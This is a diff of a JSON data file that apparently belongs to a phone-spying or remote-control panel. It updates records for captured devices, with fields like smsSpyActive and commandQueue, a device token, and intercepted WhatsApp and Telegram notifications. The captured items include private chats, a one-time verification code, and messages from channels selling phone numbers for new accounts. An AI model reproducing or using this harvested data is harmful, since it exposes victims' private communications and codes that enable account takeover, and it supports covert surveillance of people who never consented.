@@ -22,6 +22,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "‎7 panggilan suara tak terjawab",
+        "time": "21/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776771487593
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "defra",
+        "content": "okee oke nyelesain ini",
+        "time": "21/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776771486934
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "TelConnect",
         "content": "[Verify] 467427. Ini adalah informasi rahasia, jangan bagikan kepada siapa pun.",
         "time": "21/04 19:38",
@@ -4003,22 +4019,6 @@
         "time": "21/04 16:59",
         "pkg": "com.whatsapp",
         "receivedAt": 1776761989945
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Dedy Hk",
-        "content": "Login",
-        "time": "21/04 16:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776761989898
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Fatar Hk",
-        "content": "Di mes 1 sini kamu ambil nanti ya",
-        "time": "21/04 16:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776761989895
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776771485037,
+    "lastSeen": 1776771486925,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,62 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Testimoni Gift",
+        "content": "🎉 User Baru Masuk!\n\n👤 @Rdwannfck\n🆔 6753193397\n⏰ 21/4/2026, 11.33.08",
+        "time": "21/04 18:38",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771487780
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
+        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: TikTok/Douyin\n• Negara: Canada 🇨🇦\n• Server: Server (4)\n• Nomor: +1365*****32\n• Waktu: 21/04/2026, 18.34",
+        "time": "21/04 18:38",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771487452
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Fastcal Shop Nokos Monitor Harga",
+        "content": "📈 UPDATE HARGA TELEGRAM\n\n📍 Negara: Indonesia\n🕐 Waktu: 21/4/2026, 18.35.14\n📊 Total Server: 75\n📦 Stok Total: 3725\n\n━━━━━━━━━━━━━━━━━━━\n\n🔴 HARGA NAIK!\n\nServer 6\n💰 Rp 3.800 → Rp 4.700\n📈 Naik Rp 900 (23.7%)\n📊 Rate: 100% | 📦 Stok: 1\n\nServer 47\n💰 Rp 2.750 → Rp 3.550\n📈 Naik Rp 800 (29.1%)\n📊 Rate: 100% | 📦 Stok: 26\n\nServer 48\n💰 Rp 2.700 → Rp 3.900\n📈 Naik Rp 1.200 (44.4%)\n📊 Rate: 100% | 📦 Stok: 26\n\nServer 49\n💰 Rp 2.700 → Rp 3.950\n📈 Naik Rp 1.250 (46.3%)\n📊 Rate: 100% | 📦 Stok: 26\n\nServer 50\n💰 Rp 2.700 → Rp 3.950\n📈 Naik Rp 1.250 (46.3%)\n📊 Rate: 100% | 📦 Stok: 27\n\nServer 51\n💰 Rp 2.650 → Rp 3.950\n📈 Naik Rp 1.300 (49.1%)\n📊 Rate: 100% | 📦 Stok: 35\n\nServer 52\n💰 Rp 2.650 → Rp 4.000\n📈 Naik Rp 1.350 (50.9%)\n📊 Rate: 100% | 📦 Stok: 36\n\nServer 53\n💰 Rp 2.650 → Rp 4.000\n📈 Naik Rp 1.350 (50.9%)\n📊 Rate: 100% | 📦 Stok: 36\n\nServer 54\n💰 Rp 2.650 → Rp 4.050\n📈 Naik Rp 1.400 (52.8%)\n📊 Rate: 100% | 📦 Stok: 36\n\nServer 55\n💰 Rp 2.600 → Rp 4.550\n📈 Naik Rp 1.950 (75%)\n📊 Rate: 100% | 📦 Stok: 39\n\nServer ",
+        "time": "21/04 18:38",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771487147
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝐊𝐚𝐲𝐲'𝐳? ♰",
+        "content": "TAWARIN PAYMENT PREM DH ADA QR PV DANA 100K PV @Xrawrr",
+        "time": "21/04 18:38",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771487127
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗞𝗮𝗹𝘇𝘇 [𝗼𝗽𝗲𝗻 𝗽𝗮𝗻𝗲𝗹]",
+        "content": "rill anti pt pt",
+        "time": "21/04 18:38",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771487109
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16600 pesan baru dari 112 obrolan",
+        "time": "21/04 18:38",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771487016
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Generate | Panel Free",
+        "content": "Nanti gua akan update membuat 2 cabang soalnya kalo 1 cabang panel kalian otomatis kena delete sama pusat",
+        "time": "21/04 18:38",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776771486850
+      },
       {
         "appName": "Telegram",
         "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
@@ -14346,62 +14402,6 @@
         "time": "21/04 18:01",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769299311
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 18:01",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769297385
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 18:01",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769297374
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 18:01",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769297300
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 18:01",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769297241
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 18:01",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769297181
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 18:01",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769297104
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16957 pesan baru dari 115 obrolan",
-        "time": "21/04 18:01",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769297094
       }
     ],
     "galleryPhotos": [],
